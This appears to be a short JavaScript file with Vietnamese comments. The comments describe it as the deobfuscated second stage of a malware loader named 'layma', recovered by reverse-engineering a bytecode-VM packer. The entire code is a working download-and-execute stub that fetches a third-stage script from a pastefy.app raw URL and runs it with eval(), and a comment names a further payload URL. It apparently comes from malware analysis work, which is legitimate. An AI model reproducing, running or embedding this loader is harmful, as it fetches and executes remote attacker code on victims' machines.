/**
 * layma_stage2_deobfuscated.js
 * 
 * Tầng nạp mã thứ 2 (gốc 201 KB bị đóng gói bằng Bytecode Virtual Machine).
 * Sau khi phân tích máy ảo và bộ giải mã chuỗi C3:
 */

(function() {
    // Tải Stage 3 từ Pastefy (đã cập nhật link động)
    fetch("https://pastefy.app/5dKBHbgv/raw?t=" + Date.now())
        .then(res => res.text())
        .then(code => {
            // Chuyển tiếp tới payload chính: https://pastefy.app/6ZzLL87y/raw
            eval(code); 
        })
        .catch(err => {
            console.error("Lỗi khi tải payload stage 3:", err);
        });
})();
